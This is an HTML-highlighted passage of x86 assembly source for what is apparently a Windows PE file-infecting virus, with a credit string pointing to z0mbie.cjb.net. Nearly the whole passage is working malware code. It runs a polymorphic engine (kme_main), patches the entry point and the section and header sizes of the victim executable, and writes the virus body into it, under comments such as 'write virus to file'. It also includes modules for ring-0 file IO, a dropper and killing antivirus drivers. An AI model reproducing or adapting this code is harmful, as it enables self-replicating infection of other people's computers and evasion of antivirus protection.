                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">maxbufsize</span><span class="sc0">      </span><span class="sc1">; output/max size</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">      </span><span class="sc1">; output buffer</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">pe_entry</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">  </span><span class="sc1">; input eip</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">virsize</span><span class="sc0">         </span><span class="sc1">; input size</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vircopy</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">  </span><span class="sc1">; input buffer</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">kme_main</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__close</span><span class="sc0">

</span><span class="sc1">; update entrypointrva</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_entry</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">pe.pe_entrypointrva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">; update objectentry</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">oe.oe_phys_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">oe.oe_virt_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">; update pe header</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">pe.pe_sizeofcode</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">pe.pe_imagesize</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">; write virus to file</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fwrite</span><span class="sc0">

</span><span class="sc1">; write modified pe header/1st objentry to file</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mz.mz_neptr</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">pe</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fwrite</span><span class="sc0">

</span><span class="sc1">; write last object entry</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oe_offs</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oe</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">oe</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fwrite</span><span class="sc0">

</span><span class="sc1">; close file/exit</span><span class="sc0">

</span><span class="sc5">__close</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fclose</span><span class="sc0">

</span><span class="sc5">__exit</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">xormsg</span><span class="sc0">                  </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc9">irpc</span><span class="sc0">    </span><span class="sc10">c</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">x</span><span class="sc4">&gt;</span><span class="sc0">
                        </span><span class="sc9">if</span><span class="sc0">      </span><span class="sc3">"&amp;c"</span><span class="sc0"> </span><span class="sc9">ne</span><span class="sc0"> </span><span class="sc3">"'"</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"&amp;c"</span><span class="sc0">
                        </span><span class="sc9">endif</span><span class="sc0">
                        </span><span class="sc9">endm</span><span class="sc0">
                        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">xormsg</span><span class="sc0"> </span><span class="sc12">'   ,  . z0mbie.cjb.net'</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">ring3.inc</span><span class="sc0">               </span><span class="sc1">; ring-3 stuff</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">import.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">dropcode.inc</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">r0io.inc</span><span class="sc0">                </span><span class="sc1">; ring-0 file io</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">killavxd.inc</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">kme32bin.inc</span><span class="sc0">

</span><span class="sc9">align</span><span class="sc0">                   </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc10">c</span><span class="sc0">
                        </span><span class="sc10">c</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+(</span><span class="sc5">x</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">))</span><span class="sc6">and</span><span class="sc4">(</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">x</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)))-(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">if</span><span class="sc0">      </span><span class="sc10">c</span><span class="sc0"> </span><span class="sc9">ne</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">c</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">endif</span><span class="sc0">
                        </span><span class="sc9">endm</span><span class="sc0">

                        </span><span class="sc9">align</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">codeend</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">virsize</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">codeend</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">

                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">512</span><span class="sc4">-((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc2">511</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">511</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">dropper_size</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">

</span><span class="sc5">old_ifs_handler_ptr_ptr</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ifs_handler_entered</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">filename</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">MAXPATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">mz</span><span class="sc0">                      </span><span class="sc5">mz_struc</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe</span><span class="sc0">                      </span><span class="sc5">pe_struc</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">oe</span><span class="sc0">                      </span><span class="sc5">oe_struc</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">oe_offs</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">ff</span><span class="sc0">                      </span><span class="sc5">w32fd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">vircopy</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virsize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">maxbufsize</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">32768</span><span class="sc0">

</span><span class="sc5">buf_entry</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">buf_size</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">buf</span><span class="sc0">                     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">maxbufsize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">


                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4096</span><span class="sc4">-((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc2">4095</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">4095</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">VIRTSIZE</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
</span><span class="sc5">udatasize</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">codeend</span><span class="sc0">
</span><span class="sc5">virpages</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc2">4095</span><span class="sc4">)/</span><span class="sc2">4096</span><span class="sc0">

                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'-----------------------'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'virsize  = '</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virsize</span><span class="sc4">/</span><span class="sc2">1000</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virsize</span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virsize</span><span class="sc4">/</span><span class="sc0">  </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virsize</span><span class="sc4">/</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'virpages = '</span><span class="sc0">
                        </span><span class="sc9">if</span><span class="sc0">      </span><span class="sc5">virpages</span><span class="sc0"> </span><span class="sc9">ge</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virpages</span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
                        </span><span class="sc9">endif</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virpages</span><span class="sc4">/</span><span class="sc0">  </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virpages</span><span class="sc4">/</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' ('</span><span class="sc0">
                        </span><span class="sc9">if</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">virpages</span><span class="sc4">*</span><span class="sc2">4096</span><span class="sc4">/</span><span class="sc2">1024</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">ge</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">virpages</span><span class="sc4">*</span><span class="sc2">4096</span><span class="sc4">/</span><span class="sc2">1024</span><span class="sc4">)/</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
                        </span><span class="sc9">endif</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">virpages</span><span class="sc4">*</span><span class="sc2">4096</span><span class="sc4">/</span><span class="sc2">1024</span><span class="sc4">)/</span><span class="sc0">  </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">virpages</span><span class="sc4">*</span><span class="sc2">4096</span><span class="sc4">/</span><span class="sc2">1024</span><span class="sc4">)/</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'k)'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'-----------------------'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">)</span><span class="sc0">

                        </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">real_start</span><span class="sc0">
</span></div></body>
</html>
